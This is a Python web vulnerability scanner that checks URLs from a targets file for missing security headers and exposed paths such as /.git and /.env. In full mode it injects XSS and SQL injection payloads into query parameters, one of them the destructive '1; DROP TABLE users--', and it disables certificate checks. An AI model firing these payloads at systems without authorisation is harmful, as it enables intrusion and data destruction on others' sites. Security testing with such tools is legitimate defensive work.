#!/usr/bin/env python3
# STARTFILES
# targets.txt "List of URLs to scan, one per line (example: https://example.com)"
# ENDFILES
# ARGS
# SCAN_TYPE "Type of scan to perform: full, quick, or passive"
# ENDARGS
# AUTHOR: Security Tester

import sys
import re
import urllib.parse
import concurrent.futures
import ssl
import socket
from datetime import datetime
import json
import http.client
import time
import random
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError

# Disable SSL certificate verification (only for testing!)
ssl._create_default_https_context = ssl._create_unverified_context

# Define vulnerability patterns
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><script>alert(1)</script>"
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "1' OR '1'='1",
    "' OR 1=1--",
    "\" OR 1=1--",
    "1; DROP TABLE users--"
]

# Common directories for directory traversal testing
COMMON_DIRS = [
    "/admin",
    "/login",
    "/wp-admin",
    "/backup",
    "/config",
    "/dashboard",
    "/console",
    "/.git",
    "/.env",
    "/api",
    "/test",
    "/dev"
]

# User agent rotation
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"
]

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def fetch_url(url, method="GET", data=None, additional_headers=None):
    """Fetch URL and return response"""
    headers = {
        "User-Agent": get_random_user_agent(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
    }
    
    if additional_headers:
        headers.update(additional_headers)
    
    try:
        if data:
            data = data.encode('utf-8')
        
        req = Request(url, headers=headers, data=data, method=method)
        start_time = time.time()
        response = urlopen(req, timeout=10)
        response_time = time.time() - start_time
        
        content = response.read().decode('utf-8', errors='ignore')
        return {
            "status": response.status,
            "headers": dict(response.getheaders()),
            "content": content,
            "response_time": response_time
        }
    except HTTPError as e:
        return {
            "status": e.code,
            "headers": dict(e.headers),
            "content": e.read().decode('utf-8', errors='ignore') if e.read() else "",
            "error": str(e)
        }
    except URLError as e:
        return {"error": str(e)}
    except Exception as e:
        return {"error": str(e)}

def check_xss(url):
    """Check for XSS vulnerabilities"""
    results = []
    parsed_url = urllib.parse.urlparse(url)
    
    if not parsed_url.query:
        return results
    
    params = urllib.parse.parse_qs(parsed_url.query)
    
    for param_name, param_values in params.items():
        for payload in XSS_PAYLOADS:
            # Create a new params dictionary with the XSS payload
            new_params = params.copy()
            new_params[param_name] = [payload]
            
            # Build the new query string
            new_query = urllib.parse.urlencode(new_params, doseq=True)
            
            # Build the URL with the XSS payload
            test_url = urllib.parse.urlunparse((
                parsed_url.scheme,
                parsed_url.netloc,
                parsed_url.path,
                parsed_url.params,
                new_query,
                parsed_url.fragment
            ))
            
            # Fetch the URL with the XSS payload
            response = fetch_url(test_url)
            
            if "error" not in response and payload in response["content"]:
                results.append({
                    "type": "XSS",
                    "url": test_url,
                    "param": param_name,
                    "payload": payload,
                    "status": response["status"],
                    "success": True
                })
    
    return results

def check_sqli(url):
    """Check for SQL injection vulnerabilities"""
    results = []
    parsed_url = urllib.parse.urlparse(url)
    
    if not parsed_url.query:
        return results
    
    params = urllib.parse.parse_qs(parsed_url.query)
    
    for param_name, param_values in params.items():
        for payload in SQLI_PAYLOADS:
            # Create a new params dictionary with the SQL injection payload
            new_params = params.copy()
            new_params[param_name] = [payload]
            
            # Build the new query string
            new_query = urllib.parse.urlencode(new_params, doseq=True)
            
            # Build the URL with the SQL injection payload
            test_url = urllib.parse.urlunparse((
                parsed_url.scheme,
                parsed_url.netloc,
                parsed_url.path,
                parsed_url.params,
                new_query,
                parsed_url.fragment
            ))
            
            # Fetch the URL with the SQL injection payload
            response = fetch_url(test_url)
            
            # Check for SQL error messages
            if "error" not in response and response["content"]:
                sql_errors = [
                    "SQL syntax",
                    "mysql_fetch",
                    "ORA-",
                    "syntax error",
                    "PostgreSQL",
                    "incorrect syntax",
                    "unclosed quotation mark",
                    "SQLite3::"
                ]
                
                for error in sql_errors:
                    if error.lower() in response["content"].lower():
                        results.append({
                            "type": "SQLi",
                            "url": test_url,
                            "param": param_name,
                            "payload": payload,
                            "error": error,
                            "status": response["status"],
                            "success": True
                        })
    
    return results

def check_open_directories(base_url):
    """Check for open directories"""
    results = []
    
    for directory in COMMON_DIRS:
        test_url = base_url.rstrip("/") + directory
        response = fetch_url(test_url)
        
        if "error" not in response and response["status"] in [200, 301, 302, 307]:
            # Check if it's not a 404 disguised as a 200
            if "not found" not in response["content"].lower() and "404" not in response["content"]:
                results.append({
                    "type": "Open Directory",
                    "url": test_url,
                    "status": response["status"],
                    "success": True
                })
    
    return results

def check_headers(url):
    """Check for security headers"""
    results = []
    
    response = fetch_url(url)
    
    if "error" in response:
        return results
    
    headers = response["headers"]
    
    # Check for important security headers
    security_headers = {
        "X-XSS-Protection": "Missing X-XSS-Protection header",
        "X-Content-Type-Options": "Missing X-Content-Type-Options header",
        "X-Frame-Options": "Missing X-Frame-Options header",
        "Content-Security-Policy": "Missing Content-Security-Policy header",
        "Strict-Transport-Security": "Missing HSTS header"
    }
    
    for header, message in security_headers.items():
        if header.lower() not in [h.lower() for h in headers.keys()]:
            results.append({
                "type": "Missing Header",
                "header": header,
                "message": message,
                "url": url,
                "success": True
            })
    
    # Check for server information disclosure
    if "Server" in headers:
        results.append({
            "type": "Information Disclosure",
            "header": "Server",
            "value": headers["Server"],
            "message": "Server header reveals version information",
            "url": url,
            "success": True
        })
    
    return results

def scan_target(url, scan_type):
    """Scan a single target URL"""
    results = {"url": url, "vulnerabilities": []}
    
    try:
        # Basic site info
        print(f"\n[*] Scanning {url}")
        print("=" * 60)
        
        # Initial request
        response = fetch_url(url)
        
        if "error" in response:
            print(f"[-] Error: {response['error']}")
            return {"url": url, "error": response["error"]}
        
        print(f"[+] Status Code: {response['status']}")
        print(f"[+] Server: {response['headers'].get('Server', 'Not disclosed')}")
        
        # Always check for missing security headers (passive)
        header_results = check_headers(url)
        if header_results:
            results["vulnerabilities"].extend(header_results)
            print(f"[!] Found {len(header_results)} missing security headers")
            for res in header_results:
                print(f"    - {res['message']}")
        
        # For quick and full scans
        if scan_type in ["quick", "full"]:
            # Check for open directories
            dir_results = check_open_directories(url)
            if dir_results:
                results["vulnerabilities"].extend(dir_results)
                print(f"[!] Found {len(dir_results)} accessible directories:")
                for res in dir_results:
                    print(f"    - {res['url']} (Status: {res['status']})")
        
        # Only for full scans
        if scan_type == "full":
            # Check for XSS
            xss_results = check_xss(url)
            if xss_results:
                results["vulnerabilities"].extend(xss_results)
                print(f"[!] Found {len(xss_results)} potential XSS vulnerabilities:")
                for res in xss_results:
                    print(f"    - Parameter: {res['param']}, Payload: {res['payload']}")
            
            # Check for SQLi
            sqli_results = check_sqli(url)
            if sqli_results:
                results["vulnerabilities"].extend(sqli_results)
                print(f"[!] Found {len(sqli_results)} potential SQL injection vulnerabilities:")
                for res in sqli_results:
                    print(f"    - Parameter: {res['param']}, Error: {res['error']}")
        
        return results
    
    except Exception as e:
        print(f"[-] Error scanning {url}: {str(e)}")
        return {"url": url, "error": str(e)}

def main():
    if len(sys.argv) < 2:
        print("Usage: python web_vuln_scanner.py [scan_type]")
        print("Scan types: full, quick, passive")
        sys.exit(1)
    
    scan_type = sys.argv[1].lower()
    if scan_type not in ["full", "quick", "passive"]:
        print("Invalid scan type. Choose from: full, quick, passive")
        sys.exit(1)
    
    try:
        # Read targets from file
        with open('/tmp/targets.txt', 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("Error: targets.txt file not found")
        sys.exit(1)
    
    if not targets:
        print("No targets found in targets.txt")
        sys.exit(1)
    
    # Print scan information
    print("=" * 60)
    print(f" Web Vulnerability Scanner - {scan_type.upper()} scan")
    print("=" * 60)
    print(f"Starting scan at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Targets: {len(targets)}")
    print(f"Scan type: {scan_type}")
    print("=" * 60)
    
    # For full scans, warn about the time it might take
    if scan_type == "full":
        print("WARNING: Full scan may take a long time and generate significant traffic.")
        print("=" * 60)
    
    # Scan targets
    all_results = []
    
    # Use concurrent scanning for quick and passive scans
    if scan_type in ["quick", "passive"]:
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            future_to_url = {executor.submit(scan_target, url, scan_type): url for url in targets}
            for future in concurrent.futures.as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    result = future.result()
                    all_results.append(result)
                except Exception as e:
                    print(f"[-] Error scanning {url}: {str(e)}")
                    all_results.append({"url": url, "error": str(e)})
    else:
        # Sequential scanning for full scan to avoid overwhelming the target
        for url in targets:
            result = scan_target(url, scan_type)
            all_results.append(result)
    
    # Print summary
    print("\n" + "=" * 60)
    print(" Scan Summary")
    print("=" * 60)
    
    total_vulns = sum(len(result.get("vulnerabilities", [])) for result in all_results)
    print(f"Total vulnerabilities found: {total_vulns}")
    
    vuln_types = {}
    for result in all_results:
        for vuln in result.get("vulnerabilities", []):
            vuln_type = vuln.get("type", "Unknown")
            if vuln_type in vuln_types:
                vuln_types[vuln_type] += 1
            else:
                vuln_types[vuln_type] = 1
    
    for vuln_type, count in vuln_types.items():
        print(f"- {vuln_type}: {count}")
    
    print(f"\nScan completed at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60)

if __name__ == "__main__":
    main() 